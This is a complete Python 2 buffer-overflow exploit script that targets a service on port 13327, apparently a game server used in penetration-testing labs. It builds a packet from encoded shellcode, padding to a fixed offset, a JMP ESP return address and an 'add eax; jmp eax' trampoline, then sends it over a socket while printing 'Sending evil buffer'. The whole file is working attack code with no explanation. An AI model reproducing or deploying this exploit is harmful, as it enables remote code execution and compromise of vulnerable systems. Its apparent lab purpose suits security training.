#!/usr/bin/python
import socket
import struct

RHOST = "127.0.0.1"
RPORT = 13327

total = 4379
offset = 4368

jmpesp = struct.pack("<I", 0x08134596)

# add eax,12 + jmp eax
jmpeax = "\x83\xc0\x0c" + "\xff\xe0"

shell =  ""
shell += "\xb8\x27\x81\x86\xda\xdb\xc3\xd9\x74\x24\xf4\x5d\x31"
shell += "\xc9\xb1\x12\x31\x45\x12\x03\x45\x12\x83\xe2\x85\x64"
shell += "\x2f\xdd\x5e\x9f\x33\x4e\x22\x33\xde\x72\x2d\x52\xae"
shell += "\x14\xe0\x15\x5c\x81\x4a\x2a\xae\xb1\xe2\x2c\xc9\xd9"
shell += "\x8b\xce\x29\x18\x1c\xcd\x29\x1b\x67\x58\xc8\xab\xf1"
shell += "\x0b\x5a\x98\x4e\xa8\xd5\xff\x7c\x2f\xb7\x97\x10\x1f"
shell += "\x4b\x0f\x85\x70\x84\xad\x3c\x06\x39\x63\xec\x91\x5f"
shell += "\x33\x19\x6f\x1f"

crash = ""
crash = shell
crash += "\x41" * (offset - len(crash))
crash += jmpesp
crash += jmpeax
crash += "\x43" * (total - len(crash))
buf = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*]Sending evil buffer..."
s.connect((RHOST, RPORT))
data = s.recv(1024)
print data

s.send(buf)
s.close()
print "[*]Payload Sent!"
